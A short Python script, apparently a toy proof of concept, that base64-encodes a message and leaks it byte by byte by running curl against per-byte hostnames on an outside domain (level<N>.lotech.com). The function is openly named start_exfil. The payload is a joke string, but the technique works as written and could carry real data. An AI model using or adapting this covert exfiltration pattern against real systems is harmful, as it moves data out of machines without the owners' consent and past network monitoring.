import requests, base64
from random import randrange
import struct
import os
import subprocess


def encode(message):
    testx = base64.b64encode(message.encode('utf-8'))
    return testx

def start_exfil(binary_data):
    urls = []
    for c in binary_data:
        num_value = str(c)
        urls.append("http://level" + str(num_value) + ".lotech.com")
    return(urls)


if __name__ == '__main__':
    cipher = encode("poopy butt")
    urls = start_exfil(cipher)
    
    for url in urls:
        os.system("curl " + url)
